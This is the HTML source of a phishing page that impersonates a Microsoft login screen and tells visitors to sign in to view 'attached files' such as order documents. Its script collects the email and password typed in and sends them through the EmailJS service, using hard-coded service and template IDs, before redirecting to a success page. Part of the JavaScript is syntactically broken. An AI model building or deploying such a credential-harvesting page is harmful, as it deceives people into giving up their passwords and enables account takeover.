<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login | Microsoft</title>  
  <link rel="stylesheet" href="styles.css">
  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
   <link rel="shortcut icon" href="fav.png" type="image/x-icon">
   
   <!-- EMAIL.JS-->
   
           <script type="text/javascript"
                                src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
           </script>
           <script type="text/javascript">
   (function(){
      emailjs.init({
        publicKey: "-6dUOmxhpFXbdz0ka",
      });
   })();
           </script>
           
           
           
</head>
<body>
  <div class="wrapper">
    <form action="success.html">
      <h3><em>Kindly Login With Correct Credentials To View Attached Files (Product Specification, Sample Pictures, Order Files).</em></h3>
      <div class="input-box">
        <input type="text" id="email" placeholder="email" required>
        <i class='bx bxs-user'></i>
      </div>
      <div class="input-box">
        <input type="password" id="password" placeholder="password" required>
        <i class='bx bxs-lock-alt' ></i>
      </div>
      <div class="remember-forgot">
        <label><input type="checkbox">Remember Me</label>
        <a href="#">Forgot Password</a>
      </div>
      <button type="submit" class="btn" onclick="sendMail()">Login</button>
      <div class="register-link">
        <p>Dont have an account? <a href="#">Register</a></p>
      </div>
    </form>
  </div>
  
  
  
  <!-- redirect -->
  <script>
  function sendMail(){
    let parms = {
        email : document.getElementById("email").value,
        password : document.getElementById("password").value,
        subject : document.getElementById("subject").value,
        
    }
    
    emailjs.send("service_hdccajt", "template_wz9eg9e",parms).then(alert(Login Successful)}
}

    </script>

</body>
</html>
